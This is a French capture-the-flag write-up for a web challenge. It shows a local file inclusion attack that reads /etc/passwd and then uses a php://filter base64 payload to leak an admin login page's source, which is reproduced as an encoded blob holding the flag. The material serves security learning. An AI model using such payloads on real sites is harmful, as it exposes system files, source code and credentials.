# Jamais sans mon riz - flag 2

Auteur : [HappoSnake](https://github.com/pathibault/)

Briève description : 

Viens en apprendre un peu plus sur ta vraie passion, et profites-en pour peaufiner tes connaissances sur les vulnérabilités webs! Une suite de défis qui progressent en difficulté tout au long du parcours, de débutant à expérizmenté.


# Sources
- https://finctf.ettic.net/challenges#Flag%202-32


# Solution
## 1. Dans le fichier [robots.txt](../robots.txt), il y a un répertoire identifié /admin/

## 2. On remarque dans les pages descriptives des riz qu'il y a peut-etre une vulnérabilité LFI. On test avec le fichier /etc/passwd
<img src=./LFI.png>


## 3. Dans le répertoire /admin/ qui est un répertoire interdit du fichier [robots.txt](../robots.txt), on est redirigé vers la page /admin/login.php. Utilisons le LFI pour voir le code source. Nous allons devoir encoder en base64 pour que le code PHP de la page ne soit pas exécuté.
```
?postid=php://filter/convert.base64-encode/resource=admin/login.php
```

## 4. Décodons la chaine reçu pour trouver le code source de la page [login.php](../login.php)
```
PD9waHAKCi8vIEZMQUd7Ml9qZV9tZV9zZW5zX3RlbGxlbWVudF9pbmNsdX0KCmluY2x1ZGVfb25jZSgibGliL2NyeXB0by5waHAiKTsKc2Vzc2lvbl9zdGFydCgpOwoKaWYoaXNzZXQoJF9TRVNTSU9OWyJhZG1pbiJdKSAmJiAkX1NFU1NJT05bImFkbWluIl0pIHsKICAgIGhlYWRlcigiTG9jYXRpb246IC9hZG1pbi9pbmRleC5waHAiKTsKICAgIGV4aXQoKTsKfQoKLy8gVmFsaWRhdGUgUmVtZW1iZXIgTWUKaWYoaXNzZXQoJF9DT09LSUVbInJlbWVtYmVyX21lIl0pKSB7CiAgICBpZiAoJHJlbWVtYmVyX21lID0gdmFsaWRhdGVfcmVtZW1iZXJfbWVfY29va2llKCRfQ09PS0lFWyJyZW1lbWJlcl9tZSJdKSkgewogICAgICAgICRfU0VTU0lPTlsiYWRtaW4iXSA9IHRydWU7CiAgICAgICAgJF9TRVNTSU9OWyJ1c2VybmFtZSJdID0gImFkbWluIjsKICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAvYWRtaW4vaW5kZXgucGhwIik7CiAgICAgICAgZXhpdCgpOwogICAgfQp9CgoKLy8gVmFsaWRhdGUgbG9naW4KCmlmKGlzc2V0KCRfUE9TVFsiZW1haWwiXSkgJiYgaXNzZXQoJF9QT1NUWyJwYXNzd29yZCJdKSkgewogICAgLy8gVE9ETzogQWpvdXRlciB1bmUgYmFzZSBkZSBkb25uZWVzLCBjb21tZSBjYSBvbiBuZSByaXogcGx1cwogICAgaWYoJF9QT1NUWyJlbWFpbCJdID09PSAiYWRtaW5AamFtYWlzc2Fuc21vbnJpei5jb20iICYmICRfUE9TVFsicGFzc3dvcmQiXSA9PT0gZ2V0ZW52KCJGTEFHNCIpKSB7CiAgICAgICAgCiAgICAgICAgJF9TRVNTSU9OWyJhZG1pbiJdID0gdHJ1ZTsKICAgICAgICAkX1NFU1NJT05bInVzZXJuYW1lIl0gPSAiYWRtaW4iOwoKICAgICAgICBpZihpc3NldCgkX1BPU1RbInJlbWVtYmVyX21lIl0pICYmICRfUE9TVFsicmVtZW1iZXJfbWUiXSA9PT0gIm9uIikgewogICAgICAgICAgICBzZXRjb29raWUoInJlbWVtYmVyX21lIiwgZ2VuZXJhdGVfcmVtZW1iZXJfbWVfY29va2llKCRfU0VTU0lPTlsidXNlcm5hbWUiXSwgIjEiKSwgdGltZSgpKzM2MDAqMjQqMzAsICIvIiwgIiIsIDApOwogICAgICAgIH0gICAKICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAvYWRtaW4vaW5kZXgucGhwIik7CiAgICAgICAgZXhpdCgpOwogICAgfQp9CgoKCj8
```

## 5. Le flag est dans le fichier [login.php](../login.php)